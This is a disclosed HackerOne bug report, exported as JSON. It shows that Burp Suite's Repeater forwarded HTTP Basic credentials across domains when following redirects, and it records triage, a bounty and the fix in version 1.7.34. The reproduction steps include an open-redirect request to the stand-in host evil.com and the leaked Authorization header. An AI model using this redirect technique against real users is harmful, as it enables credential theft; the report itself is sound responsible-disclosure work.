{"id":302651,"global_id":"Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC8zMDI2NTE=","url":"https://hackerone.com/reports/302651","title":"Leak of Platform Authentication credentials via Repeater","state":"Closed","substate":"resolved","severity_rating":"low","readable_substate":"Resolved","created_at":"2018-01-05T13:30:10.984Z","submitted_at":"2018-01-05T13:30:10.984Z","is_member_of_team?":false,"reporter":{"disabled":false,"username":"jupenur","url":"/jupenur","profile_picture_urls":{"small":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"is_me?":false,"cleared":false,"hackerone_triager":false,"hacker_mediation":false},"team":{"id":15252,"url":"https://hackerone.com/portswigger","handle":"portswigger","profile_picture_urls":{"small":"https://profile-photos.hackerone-user-content.com/variants/000/015/252/60e8778f4f1fee57ea2b164a7d2ec1e2d2dd7bc8_original./3afcb5c896247e7ee8ada31b1c1eb8657e22241f911093acfe4ec7e97a3a959a","medium":"https://profile-photos.hackerone-user-content.com/variants/000/015/252/60e8778f4f1fee57ea2b164a7d2ec1e2d2dd7bc8_original./eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"permissions":[],"submission_state":"open","default_currency":"usd","awards_miles":false,"offers_bounties":true,"state":"public_mode","only_cleared_hackers":false,"profile":{"name":"PortSwigger Web Security","twitter_handle":"Burp_Suite","website":"https://portswigger.net","about":"Burp Suite is the leading software for web security testing"}},"has_bounty?":true,"in_validation?":false,"rejected_anc_report_that_can_be_sent_back_to_anc_triagers?":false,"can_view_team":true,"can_view_report":true,"is_external_bug":false,"is_published":false,"is_participant":false,"stage":4,"public":true,"visibility":"full","cve_ids":[],"singular_disclosure_disabled":false,"disclosed_at":"2018-06-13T15:11:29.437Z","bug_reporter_agreed_on_going_public_at":"2018-06-13T15:06:00.379Z","team_member_agreed_on_going_public_at":"2018-06-13T15:11:29.283Z","comments_closed?":false,"facebook_team?":false,"team_private?":false,"vulnerability_information":"Burp Repeater leaks Platform Authentication (HTTP Basic) credentials when following redirections.\n\nSteps to reproduce:\n\n- Set up an open redirection on a site you control (`example.com`).\n- Set up Platform Authentication for that same site. Use HTTP Basic auth and whatever credentials.\n- Using Repeater, issue a request to the page with the open redirection:\n\n```\nGET /redirect.php?url=http://evil.com HTTP/1.1\nHost: example.com\n\n \n```\n\n- Click on the `Follow redirection` button\n- Observe, helpless, as your HTTP Basic credentials are sent to `evil.com`:\n\n```\nGET http://evil.com/ HTTP/1.1\nHost: evil.com\nAuthorization: Basic dXNlcjpwYXNz\n\n\n```\n\nNote that there's nothing \"unusual\" about the steps to reproduce this, so it can easily happen completely by accident. On the attacker's side, exploiting this only requires logging any incoming `Authorization` headers.\n\n## Impact\n\nBurp Suite users may inadvertently send Platform Authentication credentials to unrelated third parties. This is fundamentally very sensitive information, making this a rather nasty leak.","vulnerability_information_html":"\u003cp\u003eBurp Repeater leaks Platform Authentication (HTTP Basic) credentials when following redirections.\u003c/p\u003e\n\n\u003cp\u003eSteps to reproduce:\u003c/p\u003e\n\n\u003cul\u003e\n\u003cli\u003eSet up an open redirection on a site you control (\u003ccode\u003eexample.com\u003c/code\u003e).\u003c/li\u003e\n\u003cli\u003eSet up Platform Authentication for that same site. Use HTTP Basic auth and whatever credentials.\u003c/li\u003e\n\u003cli\u003eUsing Repeater, issue a request to the page with the open redirection:\u003c/li\u003e\n\u003c/ul\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight plaintext\"\u003e\u003ccode\u003eGET /redirect.php?url=http://evil.com HTTP/1.1\nHost: example.com\n\n\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cul\u003e\n\u003cli\u003eClick on the \u003ccode\u003eFollow redirection\u003c/code\u003e button\u003c/li\u003e\n\u003cli\u003eObserve, helpless, as your HTTP Basic credentials are sent to \u003ccode\u003eevil.com\u003c/code\u003e:\u003c/li\u003e\n\u003c/ul\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight plaintext\"\u003e\u003ccode\u003eGET http://evil.com/ HTTP/1.1\nHost: evil.com\nAuthorization: Basic dXNlcjpwYXNz\n\n\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003eNote that there\u0026#39;s nothing \u0026quot;unusual\u0026quot; about the steps to reproduce this, so it can easily happen completely by accident. On the attacker\u0026#39;s side, exploiting this only requires logging any incoming \u003ccode\u003eAuthorization\u003c/code\u003e headers.\u003c/p\u003e\n\n\u003ch2 id=\"impact\"\u003eImpact\u003c/h2\u003e\n\n\u003cp\u003eBurp Suite users may inadvertently send Platform Authentication credentials to unrelated third parties. This is fundamentally very sensitive information, making this a rather nasty leak.\u003c/p\u003e\n","bounty_amount":"200.0","formatted_bounty":"$200","weakness":{"id":18,"name":"Information Disclosure"},"original_report_id":null,"original_report_url":null,"attachments":[],"allow_singular_disclosure_at":"2018-07-13T15:06:00.549Z","allow_singular_disclosure_after":-77725422.78362204,"singular_disclosure_allowed":true,"vote_count":10,"voters":["fpatrik","s_p_q_r","mygf","eveeez","geeknik","apapedulimu","naategh","666reda","omespino","cryptographer"],"severity":{"rating":"low","author_type":"Team"},"structured_scope":{"databaseId":169,"asset_type":"DOWNLOADABLE_EXECUTABLES","asset_identifier":"Burp Suite Pro/Community","max_severity":"high"},"abilities":{"assignable_team_members":[],"assignable_team_member_groups":[]},"can_edit_custom_fields_attributes":false,"activities":[{"id":2264322,"is_internal":false,"editable":false,"type":"Activities::BugTriaged","message":"Thanks for the report. We've confirmed that we can reproduce this and we'll look into fixing it.","markdown_message":"\u003cp\u003eThanks for the report. We\u0026#39;ve confirmed that we can reproduce this and we\u0026#39;ll look into fixing it.\u003c/p\u003e\n","automated_response":false,"created_at":"2018-01-05T14:31:58.702Z","updated_at":"2018-01-05T14:31:58.702Z","actor":{"username":"paj28","cleared":false,"url":"/paj28","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"portswigger","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":2264353,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"A couple of other observations about the `Follow redirection` feature (no security impact):\n\n1. Following a redirection to an absolute URL results in the entire URL being included in the first line of the generated request. E.g. in the original example above: `GET http://evil.com/ HTTP/1.1` should be `GET / HTTP/1.1`\n\n2. Following a \"meta refresh\" redirection works very poorly. E.g. the following HTML on `example.com`:\n\n```HTML\n\u003cmeta http-equiv=\"refresh\" content=\"0; url='http://whatever.example/'\"\u003e\n```\n\n...results in the following HTTP request:\n\n```\nGET /original/path/'http://whatever.example/' HTTP/1.1\nHost: example.com\n\n\n```\n\n...which is obviously incorrect.\n\nMight want to fix these as well while you're at it :)","markdown_message":"\u003cp\u003eA couple of other observations about the \u003ccode\u003eFollow redirection\u003c/code\u003e feature (no security impact):\u003c/p\u003e\n\n\u003col\u003e\n\u003cli\u003e\u003cp\u003eFollowing a redirection to an absolute URL results in the entire URL being included in the first line of the generated request. E.g. in the original example above: \u003ccode\u003eGET http://evil.com/ HTTP/1.1\u003c/code\u003e should be \u003ccode\u003eGET / HTTP/1.1\u003c/code\u003e\u003c/p\u003e\u003c/li\u003e\n\u003cli\u003e\u003cp\u003eFollowing a \u0026quot;meta refresh\u0026quot; redirection works very poorly. E.g. the following HTML on \u003ccode\u003eexample.com\u003c/code\u003e:\u003c/p\u003e\u003c/li\u003e\n\u003c/ol\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight plaintext\"\u003e\u003ccode\u003e\u0026lt;meta http-equiv=\u0026quot;refresh\u0026quot; content=\u0026quot;0; url=\u0026#39;http://whatever.example/\u0026#39;\u0026quot;\u0026gt;\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003e...results in the following HTTP request:\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight plaintext\"\u003e\u003ccode\u003eGET /original/path/\u0026#39;http://whatever.example/\u0026#39; HTTP/1.1\nHost: example.com\n\n\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003e...which is obviously incorrect.\u003c/p\u003e\n\n\u003cp\u003eMight want to fix these as well while you\u0026#39;re at it :)\u003c/p\u003e\n","automated_response":false,"created_at":"2018-01-05T15:01:17.108Z","updated_at":"2018-01-05T15:01:17.108Z","actor":{"username":"jupenur","cleared":false,"url":"/jupenur","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"portswigger","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":2269533,"is_internal":false,"editable":false,"type":"Activities::ReportSeverityUpdated","message":"","markdown_message":"","automated_response":false,"created_at":"2018-01-08T11:13:21.662Z","updated_at":"2018-01-08T11:13:21.662Z","additional_data":{"old_severity":"High (7.4)","new_severity":"Low","old_severity_id":106008,"new_severity_id":106526},"actor":{"username":"albinowax","cleared":true,"url":"/albinowax","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/056/414/9d843d496965d8c0e710de3867a41720c1577dc4_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"portswigger","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":2269549,"is_internal":false,"editable":false,"type":"Activities::BountyAwarded","message":"Thanks for the report. We currently block the cookie header when following cross-domain redirects, but clearly using a blacklist isn't the right approach. We plan to fix this in an upcoming release by regenerating headers whenever we follow a cross-domain redirect. \n\nWe're awarding this at the 'low' level since it has medium severity impact, but requires a substantial amount of user interaction. I've also filed tickets for the non-security bugs you mentioned.\n\nCheers,\n\nJames\n\n","markdown_message":"\u003cp\u003eThanks for the report. We currently block the cookie header when following cross-domain redirects, but clearly using a blacklist isn\u0026#39;t the right approach. We plan to fix this in an upcoming release by regenerating headers whenever we follow a cross-domain redirect. \u003c/p\u003e\n\n\u003cp\u003eWe\u0026#39;re awarding this at the \u0026#39;low\u0026#39; level since it has medium severity impact, but requires a substantial amount of user interaction. I\u0026#39;ve also filed tickets for the non-security bugs you mentioned.\u003c/p\u003e\n\n\u003cp\u003eCheers,\u003c/p\u003e\n\n\u003cp\u003eJames\u003c/p\u003e\n","automated_response":false,"created_at":"2018-01-08T11:19:39.054Z","updated_at":"2018-01-08T11:19:39.054Z","actor":{"url":"/portswigger","ibb":false,"profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/015/252/60e8778f4f1fee57ea2b164a7d2ec1e2d2dd7bc8_original./eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"profile":{"name":"PortSwigger Web Security"}},"bounty_amount":"200.0","bounty_currency":"usd","bonus_amount":"0.0","genius_execution_id":null,"team_handle":"portswigger","collaborator":{"username":"jupenur","url":"/jupenur"},"actor_is_team_member":true,"actor_is_concealed_member":false},{"id":2269582,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Thanks. One more thing, `Follow redirection` should probably try to emulate browser behavior for each different redirect type. For example, for an HTTP 307 redirection it should preserve the original request method, `Content-Type` header as well as the request body.","markdown_message":"\u003cp\u003eThanks. One more thing, \u003ccode\u003eFollow redirection\u003c/code\u003e should probably try to emulate browser behavior for each different redirect type. For example, for an HTTP 307 redirection it should preserve the original request method, \u003ccode\u003eContent-Type\u003c/code\u003e header as well as the request body.\u003c/p\u003e\n","automated_response":false,"created_at":"2018-01-08T11:36:58.049Z","updated_at":"2018-01-08T11:47:26.402Z","actor":{"username":"jupenur","cleared":false,"url":"/jupenur","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"portswigger","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":2858377,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"We're planning to release an update that fixes this issue next week - I'll let you know when it goes out. Thanks for your patience.","markdown_message":"\u003cp\u003eWe\u0026#39;re planning to release an update that fixes this issue next week - I\u0026#39;ll let you know when it goes out. Thanks for your patience.\u003c/p\u003e\n","automated_response":false,"created_at":"2018-06-08T12:54:50.348Z","updated_at":"2018-06-08T12:54:50.348Z","actor":{"username":"albinowax","cleared":true,"url":"/albinowax","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/056/414/9d843d496965d8c0e710de3867a41720c1577dc4_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"portswigger","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":2879539,"is_internal":false,"editable":false,"type":"Activities::BugResolved","message":"This has now been resolved in Burp Suite 1.7.34: http://releases.portswigger.net/2018/06/1734.html\n\nThanks!","markdown_message":"\u003cp\u003eThis has now been resolved in Burp Suite 1.7.34: \u003ca title=\"http://releases.portswigger.net/2018/06/1734.html\" href=\"/redirect?url=http%3A%2F%2Freleases.portswigger.net%2F2018%2F06%2F1734.html\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003ehttp://releases.portswigger.net/2018/06/1734.html\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e\u003c/p\u003e\n\n\u003cp\u003eThanks!\u003c/p\u003e\n","automated_response":false,"created_at":"2018-06-13T14:45:29.191Z","updated_at":"2018-06-13T14:45:29.191Z","actor":{"username":"albinowax","cleared":true,"url":"/albinowax","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/056/414/9d843d496965d8c0e710de3867a41720c1577dc4_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"reporter":{"username":"jupenur","url":"/jupenur"},"genius_execution_id":null,"team_handle":"portswigger","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":2879609,"is_internal":false,"editable":false,"type":"Activities::AgreedOnGoingPublic","message":"Can we make this public? H1 gives internet points for stuff that gets disclosed.","markdown_message":"\u003cp\u003eCan we make this public? H1 gives internet points for stuff that gets disclosed.\u003c/p\u003e\n","automated_response":false,"created_at":"2018-06-13T15:06:00.450Z","updated_at":"2018-06-13T15:06:00.450Z","first_to_agree":true,"actor":{"username":"jupenur","cleared":false,"url":"/jupenur","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"portswigger","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":2879640,"is_internal":false,"editable":false,"type":"Activities::AgreedOnGoingPublic","message":"Sure!","markdown_message":"\u003cp\u003eSure!\u003c/p\u003e\n","automated_response":false,"created_at":"2018-06-13T15:11:29.330Z","updated_at":"2018-06-13T15:11:29.330Z","actor":{"username":"albinowax","cleared":true,"url":"/albinowax","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/056/414/9d843d496965d8c0e710de3867a41720c1577dc4_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"portswigger","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":2879641,"is_internal":false,"editable":false,"type":"Activities::ReportBecamePublic","message":"","markdown_message":"","automated_response":false,"created_at":"2018-06-13T15:11:29.477Z","updated_at":"2018-06-13T15:11:29.477Z","actor":{"username":"albinowax","cleared":true,"url":"/albinowax","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/056/414/9d843d496965d8c0e710de3867a41720c1577dc4_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"portswigger","actor_is_team_member":true,"actor_is_concealed_member":false}],"activity_page_count":1,"activity_page_number":1,"summaries":[{"category":"team","can_view?":true,"can_create?":false},{"category":"researcher","can_view?":true,"can_create?":false}]}